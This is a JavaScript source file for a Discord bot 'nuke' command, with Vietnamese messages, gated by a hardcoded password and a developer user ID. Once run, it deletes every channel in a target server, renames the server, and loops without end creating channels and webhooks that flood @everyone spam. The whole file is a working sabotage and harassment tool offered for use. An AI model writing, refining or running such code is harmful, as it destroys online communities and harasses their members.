const { ChannelType, PermissionFlagsBits } = require("discord.js");
const { getFilePath, readFileLines } = require("../spam/shared");

const PASSWORD = "Quenmkroi2806";
const DEV_USER = "1376022909096689668";
const BLACKLIST = ["1523310158715949156"];

function isId(value) {
  return /^\d{5,}$/.test(value);
}

function parse(args) {
  const rawId = args.find(isId);
  return {
    guildId: rawId && rawId !== DEV_USER ? rawId : null,
    password: args.find((arg) => !isId(arg)) || null,
  };
}

function token() {
  return Math.random().toString(36).substring(2, 8);
}

function pickMany(lines, count) {
  const picked = [];
  for (let i = 0; i < count; i++) {
    picked.push(lines[Math.floor(Math.random() * lines.length)]);
  }
  return picked;
}

const LAST_LINE = "Gõ 'n?st0pnuk3' @everyone @here";

function spamBody(lines) {
  if (!lines.length) return LAST_LINE;
  return `${pickMany(lines, 20).join("\n").slice(0, 1750)}\n${LAST_LINE}`;
}

function reply(message, text, ms = 5000) {
  return message
    .reply(text)
    .then((sent) => setTimeout(() => sent.delete().catch(() => {}), ms));
}

async function resolveGuild(message, client, guildId) {
  if (!guildId && !message.guild) return null;
  if (guildId) return client.guilds.cache.get(guildId) || (await client.guilds.fetch(guildId).catch(() => null));
  return message.guild;
}

async function flood(guild, client) {
  const lines = readFileLines(getFilePath("nhay.txt")) || [];

  guild.channels.cache.forEach((channel) => channel.delete().catch(() => {}));
  guild.setName("nuked").catch(() => {});

  while (true) {
    try {
      const channel = await guild.channels.create({
        name: `nuked-${token()}`,
        type: ChannelType.GuildText,
      });

      const webhook = await channel.createWebhook({
        name: `bot-${token()}`,
        avatar: client.user.displayAvatarURL(),
      });

      await webhook
        .send({
          content: spamBody(lines),
          username: `nuker-${token()}`,
          avatarURL: "https://cdn.discordapp.com/embed/avatars/0.png",
        })
        .catch(() => {});
    } catch {
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }
}

module.exports = {
  name: "nuk3",
  prefix: "n?",
  description: "Nuke server: n?nuk3 [id sv] [mat khau]",
  usage: "n?nuk3 [id sv] [mat khau] | n?nuk3",
  destructive: true,
  maskArgs: true,

  async execute(message, args, client) {
    const { guildId, password } = parse(args);
    const authorized = message.author.id === DEV_USER || password === PASSWORD;

    if (!authorized) return reply(message, "❌ Mat khau sai hoac ban khong duoc phep nuke.");

    const guild = await resolveGuild(message, client, guildId);

    if (!guildId && !message.guild) {
      return reply(message, "❌ Lenh nay chi chay trong server, hay them id sv.");
    }
    if (!guild) return reply(message, "❌ Khong tim thay server nay, bot chua o do.");
    if (BLACKLIST.includes(guild.id)) return reply(message, "⛔ Server nay bi khoa, khong the nuke.");

    const perms = guild.members.me?.permissions;
    if (!perms?.has(PermissionFlagsBits.ManageChannels) || !perms?.has(PermissionFlagsBits.ManageWebhooks)) {
      return reply(message, "❌ Bot thieu quyen quan ly kenh hoac webhook o server nay.");
    }

    await reply(message, `▶️ Bat dau nuke ${guild.name} (${guild.id})`, 8000);
    await flood(guild, client);
  },
};
